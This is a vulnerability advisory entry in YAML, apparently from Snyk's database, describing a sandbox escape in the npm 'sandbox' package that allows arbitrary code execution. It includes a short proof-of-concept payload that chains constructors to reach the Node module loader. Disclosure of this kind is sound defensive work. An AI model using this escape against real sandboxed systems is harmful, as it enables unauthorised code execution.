---
- id: snykio:npm:sandbox:20160821
  title: Arbitrary Code Execution
  description: |
    [`sandbox`][1] is a nifty javascript sandbox for node.js.

    Affected versions of the package are vulnerable to Arbitrary Code
    Execution. It is possible to escape the sandbox by using a combination
    of functions and constructors, allowing an attacker access to a process
    with root permissions, and load modules of their choosing in order to
    execute malicious code.

    PoC by io Void:

        new Function("
          return (
            this.constructor.constructor('
              return (this.process.mainModule.constructor._load
             )'
            )())"
          )()
        ("util").inspect("hi")



    [1]: https://www.npmjs.com/package/sandbox
  affected_package: sandbox
  vulnerable_versions:
  - "*"
  severity: high
  package_manager: npm
  cwe:
  - CWE-94
  disclosed_date: 2016-08-21
  created_date: 2017-11-07
  last_modified_date: 2017-11-07
  credit:
  - io void
  references:
  - https://github.com/gf3/sandbox/issues/50
  source_url: https://snyk.io/vuln/npm:sandbox:20160821
